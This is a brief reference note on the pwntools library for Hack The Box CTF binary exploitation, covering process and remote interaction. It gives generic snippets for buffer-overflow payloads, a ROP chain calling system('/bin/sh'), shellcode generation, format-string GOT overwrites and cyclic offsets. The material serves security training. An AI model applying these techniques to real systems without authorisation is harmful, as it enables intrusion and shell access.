# pwntools

## Purpose
Python library for exploit development and CTF challenges. Provides everything needed for binary exploitation: process interaction, ROP chain building, shellcode generation, and more.

## Installation
```bash
pip3 install pwntools
```

## Quick Start
```python
from pwn import *

# Connect to local binary
p = process('./vuln')

# Connect to remote service
p = remote('target.htb', 1337)

# Set architecture
context.arch = 'amd64'
context.log_level = 'debug'

# Send data
p.sendline(b'payload')
p.send(b'data')
p.sendafter(b'prompt:', b'input')
p.sendlineafter(b'Password:', b'admin')

# Receive data
data = p.recv(1024)
line = p.recvline()
p.recvuntil(b'>')

# Interactive shell
p.interactive()
```

## Common Patterns
```python
# Buffer overflow with offset
payload = b'A' * 40 + p64(0xdeadbeef)
p.sendline(payload)

# ROP chain
elf = ELF('./vuln')
rop = ROP(elf)
rop.call('system', [next(elf.search(b'/bin/sh'))])
payload = b'A' * offset + rop.chain()

# Shellcode
shellcode = asm(shellcraft.sh())

# Format string
payload = fmtstr_payload(offset, {elf.got['puts']: elf.sym['win']})

# Cyclic pattern (find offset)
payload = cyclic(200)
# After crash: cyclic_find(0x61616166)
```

## HTB Usage
- Standard for binary exploitation / pwn challenges
- Script exploits for reliability and repeatability
- Built-in ELF parsing, ROP building, shellcode crafting
- `p.interactive()` drops you into a shell after exploit lands
